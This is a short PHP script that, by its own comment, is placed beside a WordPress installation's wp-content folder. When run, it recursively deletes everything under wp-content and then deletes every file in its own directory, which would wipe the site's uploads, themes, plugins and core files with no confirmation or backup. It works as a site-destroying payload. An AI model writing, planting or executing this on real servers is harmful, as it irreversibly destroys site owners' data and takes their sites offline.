<?php
// Code should be placed parallelly with wp-content folder 


$dir = 'wp-content';
function wp_unlink($dir)
{
    foreach (glob($dir . '/*') as $file) {
        if (is_dir($file))
            wp_unlink($file);
        else
            unlink($file);
    }
    rmdir($dir);
}
wp_unlink($dir);

$files = glob(__dir__ . '/*');
foreach ($files as $filee) {
    unlink($filee);
}